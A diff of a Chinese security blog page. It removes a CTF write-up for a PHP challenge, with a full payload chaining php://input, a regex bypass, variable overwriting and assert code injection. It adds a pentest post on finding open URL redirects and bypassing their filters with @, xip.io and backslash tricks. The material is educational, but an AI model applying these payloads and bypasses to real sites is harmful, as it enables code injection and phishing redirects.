@@ -108,24 +108,37 @@
 
 
 
-  <meta name="description" content="主要考察PHP Trick">
+  <meta name="description" content="URL重定向/跳转漏洞在漏洞挖掘中算是比较容易发现的一种，这里简单介绍下其原理，着重说一些发现过程和绕过方式">
+<meta name="keywords" content="Web">
 <meta property="og:type" content="article">
-<meta property="og:title" content="某CTF的Baby PHP">
-<meta property="og:url" content="http://yoursite.com/2018/10/18/某CTF的Baby-PHP/index.html">
+<meta property="og:title" content="Url Redirect">
+<meta property="og:url" content="http://yoursite.com/2019/03/31/URLRedirect/index.html">
 <meta property="og:site_name" content="Noel&#39;s Blog">
-<meta property="og:description" content="主要考察PHP Trick">
+<meta property="og:description" content="URL重定向/跳转漏洞在漏洞挖掘中算是比较容易发现的一种，这里简单介绍下其原理，着重说一些发现过程和绕过方式">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-10-18T13:42:35.666Z">
+<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/1.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/5.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/6.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/8.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/9.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/10.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/11.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/12.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/03/31/URLRedirect/7.jpg">
+<meta property="og:updated_time" content="2019-03-31T04:35:35.357Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="某CTF的Baby PHP">
-<meta name="twitter:description" content="主要考察PHP Trick">
+<meta name="twitter:title" content="Url Redirect">
+<meta name="twitter:description" content="URL重定向/跳转漏洞在漏洞挖掘中算是比较容易发现的一种，这里简单介绍下其原理，着重说一些发现过程和绕过方式">
+<meta name="twitter:image" content="http://yoursite.com/2019/03/31/URLRedirect/1.jpg">
 
 
 
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/10/18/某CTF的Baby-PHP/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/03/31/URLRedirect/"/>
 
 
 
@@ -135,7 +148,7 @@
   };
 </script>
 
-  <title>某CTF的Baby PHP | Noel's Blog</title>
+  <title>Url Redirect | Noel's Blog</title>
   
 
 
@@ -296,7 +309,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/18/某CTF的Baby-PHP/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/31/URLRedirect/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Noel">
@@ -313,7 +326,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">某CTF的Baby PHP
+          <h1 class="post-title" itemprop="name headline">Url Redirect
               
             
           </h1>
@@ -338,7 +351,7 @@
                 
               
 
-              <time title="创建时间：2018-10-18 00:00:00 / 修改时间：21:42:35" itemprop="dateCreated datePublished" datetime="2018-10-18T00:00:00+08:00">2018-10-18</time>
+              <time title="创建时间：2019-03-31 00:00:00 / 修改时间：12:35:35" itemprop="dateCreated datePublished" datetime="2019-03-31T00:00:00+08:00">2019-03-31</time>
             
 
             
@@ -360,7 +373,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/渗透测试/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>
 
                 
                 
@@ -402,25 +415,60 @@
       
 
       
-        <p>主要考察PHP Trick</p>
-<a id="more"></a>
-<h3 id="源码参上"><a href="#源码参上" class="headerlink" title="源码参上"></a>源码参上</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'msg'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$msg = $_GET[<span class="string">'msg'</span>];</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($msg)!==<span class="string">"Hello Challenge!"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Wow so rude!!!!1'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello Hacker! Have a look around.\n"</span>;</span><br><span class="line"></span><br><span class="line">@$k1=$_GET[<span class="string">'key1'</span>];</span><br><span class="line">@$k2=$_GET[<span class="string">'key2'</span>];</span><br><span class="line"></span><br><span class="line">$cc = <span class="number">1337</span>;$bb = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(intval($k1) !== $cc || $k1 === $cc)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lol no\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($k2) == $bb)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^\d+＄/'</span>, $k2) &amp;&amp; !is_numeric($k2))&#123;</span><br><span class="line">        <span class="keyword">if</span>($k2 == $cc)&#123;</span><br><span class="line">            @$cc = $_GET[<span class="string">'cc'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>($k1,$k2) = [$k2, $k1];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(substr($cc, $bb) === sha1($cc))&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $lel =&gt; $hack)&#123;</span><br><span class="line">        $$lel = $hack;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$‮b = <span class="string">"2"</span>;$a=<span class="string">"‮b"</span>;<span class="comment">//;1=b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($$a !== $k1)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lel no\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// plz die now</span></span><br><span class="line">assert_options(ASSERT_BAIL, <span class="number">1</span>);</span><br><span class="line">assert(<span class="string">"$bb == $cc"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Good Job ;)"</span>;</span><br><span class="line"><span class="comment">// TODO</span></span><br><span class="line"><span class="comment">// echo $flag;</span></span><br></pre></td></tr></table></figure>
-<h4 id="首先第一点"><a href="#首先第一点" class="headerlink" title="首先第一点"></a>首先第一点</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@$msg = $_GET[<span class="string">'msg'</span>];</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($msg)!==<span class="string">"Hello Challenge!"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Wow so rude!!!!1'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>需要使用<code>php://input</code>,或者是<code>data://text/plain</code></p>
-<p><code>php://iinput</code>形如</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /?msg=php://input HTTP/1.1</span><br><span class="line">Host ****</span><br><span class="line"></span><br><span class="line">Hello Challenge!</span><br></pre></td></tr></table></figure>
-<p><code>data://text/plain</code>的话是构造 </p>
-<p><code>?msg=data://text/plain,Hello Challenge!</code></p>
-<h4 id="第二点"><a href="#第二点" class="headerlink" title="第二点"></a>第二点</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(intval($k1) !== $cc || $k1 === $cc)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lol no\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里的<code>$k1===$cc</code>用的是三个等号进行比较，比较的两个变量要求类型一致，而PHP传参的时候是默认String类型的，所以<code>$key1=1337</code>即可</p>
-<h4 id="第三点"><a href="#第三点" class="headerlink" title="第三点"></a>第三点</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($k2) == $bb)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^\d+＄/'</span>, $k2) &amp;&amp; !is_numeric($k2))&#123;</span><br><span class="line">        <span class="keyword">if</span>($k2 == $cc)&#123;</span><br><span class="line">            @$cc = $_GET[<span class="string">'cc'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里需要注意<code>preg_match(&#39;/^\d+＄/&#39;, $k2)</code>中的是<code>＄</code>而非<code>$</code>,所以只要构造<code>$key2=000000000000000000000000000000000001337%EF%BC%84</code>即可绕过</p>
-<h4 id="第四点"><a href="#第四点" class="headerlink" title="第四点"></a>第四点</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr($cc, $bb) === sha1($cc))&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $lel =&gt; $hack)&#123;</span><br><span class="line">        $$lel = $hack;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$‮b = <span class="string">"2"</span>;$a=<span class="string">"‮b"</span>;<span class="comment">//;1=b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($$a !== $k1)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lel no\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>传值<code>cc[]=</code>此时substr和sha1都会返回false，之后便是变量覆盖，再传参<code>k1=2</code>即可.</p>
-<h4 id="第五点"><a href="#第五点" class="headerlink" title="第五点"></a>第五点</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(<span class="string">"$bb == $cc"</span>);</span><br></pre></td></tr></table></figure>
-<p>构造<code>$bb=$GLOBALS;\\</code>即可</p>
-<p>所以最后的payload为</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?msg=php://input&amp;key1=1337&amp;key2=000000000000000000000000000000000001337%EF%BC%84&amp;cc[]=&amp;k1=2&amp;bb=var_dump(<span class="variable">$GLOBALS</span>);//</span><br></pre></td></tr></table></figure>
+        <font color="green">URL重定向/跳转漏洞在漏洞挖掘中算是比较容易发现的一种，这里简单介绍下其原理，着重说一些发现过程和绕过方式</font><br><a id="more"></a><br><br><br>### <font color="dark">成因</font>
+
+<p>常见方式</p>
+<ul>
+<li>META标签的refresh</li>
+<li>Javascript</li>
+<li>header</li>
+</ul>
+<p>meta</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0; url=url"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Javascript</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">"url"</span>;</span><br></pre></td></tr></table></figure>
+<p>header</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">"Location:url"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当上述栗子中的url未限制时就产生了URL重定向/跳转漏洞</p>
+<h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a><font color="dark">发现</font></h3><ul>
+<li><p>在退出处常见URL跳转</p>
+<p><img src="/2019/03/31/URLRedirect/1.jpg" alt=""></p>
+</li>
+<li><p>利用burp的search，搜索=http 同时返回包为302的内容</p>
+<p><img src="/2019/03/31/URLRedirect/3.png" alt=""></p>
+<p>发包到repeater,略作修改</p>
+<p><img src="/2019/03/31/URLRedirect/4.png" alt=""></p>
+</li>
+</ul>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a><font color="dark">绕过</font></h3><p>一般来说URL跳转发现比较容易，但是利用起来比较难，因为许多会做一些防护</p>
+<p>1.xip.io绕过</p>
+<p><img src="/2019/03/31/URLRedirect/5.jpg" alt=""></p>
+<p>这里只要不是www就会强制返回到<a href="https://xue.xx.com/login" target="_blank" rel="noopener">https://xue.xx.com/login</a></p>
+<p>但是利用<a href="https://xue.xx.com.*.xip.io" target="_blank" rel="noopener">https://xue.xx.com.*.xip.io</a></p>
+<p><img src="/2019/03/31/URLRedirect/6.jpg" alt=""></p>
+<p>2.使用@绕过</p>
+<p>这里并不能采用xip.io的方式绕过</p>
+<p><img src="/2019/03/31/URLRedirect/8.jpg" alt=""></p>
+<p>可以使用@但是如果@后的域名不在规定范围内同样不可跳转</p>
+<p><img src="/2019/03/31/URLRedirect/9.jpg" alt=""></p>
+<p>这个时候可以在@前加上/，\或者?尝试下</p>
+<p><img src="/2019/03/31/URLRedirect/10.jpg" alt=""></p>
+<p>3.http://后加反斜杠绕过</p>
+<p>有些时候@和.xip.io都不能使</p>
+<p><img src="/2019/03/31/URLRedirect/11.jpg" alt=""></p>
+<p>这个时候可以采用http://\的样式尝试绕过</p>
+<p><img src="/2019/03/31/URLRedirect/12.jpg" alt=""></p>
+<p>4.某些加密</p>
+<p><a href="http://xx.xx.cn/?src=l4uLj8XQ0IiIiNGHlpOK0ZyQktCFl4qekYuWoM7IycfIztGXi5KT" target="_blank" rel="noopener">http://xx.xx.cn/?src=l4uLj8XQ0IiIiNGHlpOK0ZyQktCFl4qekYuWoM7IycfIztGXi5KT</a></p>
+<p>这个链接会跳转到<a href="http://www.xilu.com/zhuanti_176871.html" target="_blank" rel="noopener">http://www.xilu.com/zhuanti_176871.html</a></p>
+<p>将 <strong>l4uLj8XQ0IiIiNGHlpOK0ZyQktCFl4qekYuWoM7IycfIztGXi5KT</strong> base64解密</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x97\x8b\x8b\x8f\xc5\xd0\xd0\x88\x88\x88\xd1\x87\x96\x93\x8a\xd1\x9c\x90\x92\xd0\x85\x97\x8a\x9e\x91\x8b\x96\xa0\xce\xc8\xc9\xc7\xc8\xce\xd1\x97\x8b\x92\x93</span><br></pre></td></tr></table></figure>
+<p>推测与跳转的链接一一对应，推测出对应关系表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&apos;a&apos;:&apos;9e&apos;, &apos;b&apos;:&apos;9d&apos;, &apos;c&apos;:&apos;9c&apos;, &apos;d&apos;:&apos;9b&apos;, &apos;e&apos;:&apos;9a&apos;,&apos;f&apos;:&apos;99&apos;, &apos;g&apos;:&apos;98&apos;, &apos;h&apos;:&apos;97&apos;, &apos;i&apos;:&apos;96&apos;, &apos;j&apos;:&apos;95&apos;,</span><br><span class="line"> &apos;k&apos;:&apos;94&apos;, &apos;l&apos;:&apos;93&apos;, &apos;m&apos;:&apos;92&apos;, &apos;n&apos;:&apos;91&apos;, &apos;o&apos;:&apos;90&apos;,&apos;p&apos;:&apos;8f&apos;, &apos;q&apos;:&apos;8e&apos;, &apos;r&apos;:&apos;8d&apos;, &apos;s&apos;:&apos;8c&apos;, &apos;t&apos;:&apos;8b&apos;,</span><br><span class="line"> &apos;u&apos;:&apos;8a&apos;, &apos;v&apos;:&apos;89&apos;, &apos;w&apos;:&apos;88&apos;, &apos;x&apos;:&apos;87&apos;, &apos;y&apos;:&apos;86&apos;,&apos;z&apos;:&apos;85&apos;,&apos;.&apos;:&apos;d1&apos;,&apos;/&apos;:&apos;d0&apos;,&apos;:&apos;:&apos;c5&apos;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/03/31/URLRedirect/7.jpg" alt=""></p>
+<blockquote>
+<p>我寻了半生的春天，你一笑便是了。</p>
+</blockquote>
 
       
     </div>
@@ -439,6 +487,12 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+          
+        </div>
+      
 
       
       
@@ -448,8 +502,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/10/13/护网杯部分题目Wp/" rel="next" title="护网杯部分题目Wp">
-                <i class="fa fa-chevron-left"></i> 护网杯部分题目Wp
+              <a href="/2019/03/31/URL跳转/" rel="next" title="Url Redirect">
+                <i class="fa fa-chevron-left"></i> Url Redirect
               </a>
             
           </div>
@@ -457,10 +511,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/10/28/monogodb-moadmin-php漏洞分析/" rel="prev" title="monogodb moadmin.php漏洞分析">
-                monogodb moadmin.php漏洞分析 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -662,7 +712,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#源码参上"><span class="nav-number">1.</span> <span class="nav-text">源码参上</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#首先第一点"><span class="nav-number">1.1.</span> <span class="nav-text">首先第一点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第二点"><span class="nav-number">1.2.</span> <span class="nav-text">第二点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第三点"><span class="nav-number">1.3.</span> <span class="nav-text">第三点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第四点"><span class="nav-number">1.4.</span> <span class="nav-text">第四点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第五点"><span class="nav-number">1.5.</span> <span class="nav-text">第五点</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#发现"><span class="nav-number">1.</span> <span class="nav-text">发现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过"><span class="nav-number">2.</span> <span class="nav-text">绕过</span></a></li></ol></div>
             
 
           </div>
